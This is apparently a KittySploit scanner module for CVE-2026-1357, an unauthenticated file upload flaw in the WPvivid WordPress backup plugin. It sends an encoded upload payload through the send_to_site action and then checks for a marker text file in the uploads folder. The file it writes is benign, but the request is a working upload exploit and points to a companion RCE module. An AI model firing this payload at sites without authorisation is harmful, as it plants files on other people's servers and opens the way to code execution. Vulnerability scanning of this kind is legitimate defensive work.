#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WPvivid Backup & Migration plugin for WordPress <= 0."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WPvivid Backup & Migration <= 0.9.123 - Arbitrary File Upload Detection',
        'description': 'WPvivid Backup & Migration plugin for WordPress <= 0.9.123 contains an unauthenticated arbitrary file upload vulnerability caused by improper error handling in RSA decryption and lack of path sanitization, letting unauthenticated attackers upload arbitrary PHP files and achieve remote code execution via wpvivid_action=send_to_site parameter.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'modules': [
            'exploits/multi/http/wpvivid_cve_2026_1357_rce',
        ],
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'wordpress', 'wp', 'wp-plugin', 'wpvivid', 'file-upload', 'rce', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://vulnerabletarget.com/VT-2026-1357',
            'https://github.com/LucasM0ntes/POC-CVE-2026-1357',
            'https://www.wordfence.com/threat-intel/vulnerabilities/id/e5af0317-ef46-4744-9752-74ce228b5f37',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-1357',
        ],
        'cve': 'CVE-2026-1357',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data='wpvivid_action=send_to_site&wpvivid_content=MDAzQUJDMDAwMDAwMDAwMDAwMDExMDUGpYqxgOo0%2FZM3%2BLE%2B23CYS%2BI8Sbr6wwwU6dJweFxMk%2BOogH3GIpPZZMrm72oUS3vnrlf0AXv1vmGVBIbLo3QcQs%2B4JU7cLQw1kWByCFlYkpHcBuzxjEbVtT8VSdFgb6NLW6cpP4BdWT8bJx%2F%2FAOO09m3EFtf2sOcE%2BJjFJAew%2BELondwDkz3u5mssxGaQrlvWgaIlmPwz3FZx8dWC%2FHy7k4P3S5IJ7JV0tefjHJKCOzjPHngkZENu1uI2LmE6JaeF7XdXJCcmFOrNex4yJgIO0raawogHW457fM4wXKDnrM3bwxeLn5KwvAgadaTj4F9zWHxnjBmpa%2BtIaohISVcA5%2BGv6cAA95rzOoXBGUaI\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('"result":"success"',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-content/uploads/vt-nuclei-test.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('CVE-2026-1357-nuclei-verification-test',)
        if any(m in body for m in body_any):
            self.set_info(severity='critical', reason='WPvivid Backup & Migration <= 0.9.123 - Arbitrary File Upload detected', path=path)
            return True
        return False

